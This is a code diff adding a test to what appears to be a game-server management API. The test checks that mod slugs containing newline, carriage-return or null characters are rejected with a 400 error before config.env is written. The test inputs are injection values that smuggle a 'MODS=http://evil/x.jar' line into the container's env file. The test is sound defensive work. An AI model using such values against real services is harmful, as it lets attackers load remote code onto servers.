@@ -256,6 +256,23 @@ MEMORY=4G
       const body = JSON.parse(response.body);
       expect(body.added).toEqual(['fabric-api']); // sodium already exists
     });
+
+    // The slugs end up in config.env, the container's env_file (#726)
+    it.each(['x\nMODS=http://evil/x.jar', 'x\rMODS=http://evil/x.jar', 'x\u0000y'])(
+      'rejects slug %j with 400 without writing config.env',
+      async (slug) => {
+        mockedServerExists.mockReturnValue(true);
+
+        const response = await app.inject({
+          method: 'POST',
+          url: '/api/servers/myserver/mods',
+          payload: { slugs: ['fabric-api', slug] },
+        });
+
+        expect(response.statusCode).toBe(400);
+        expect(mockWriteFileSync).not.toHaveBeenCalled();
+      }
+    );
   });
 
   // ============================================================
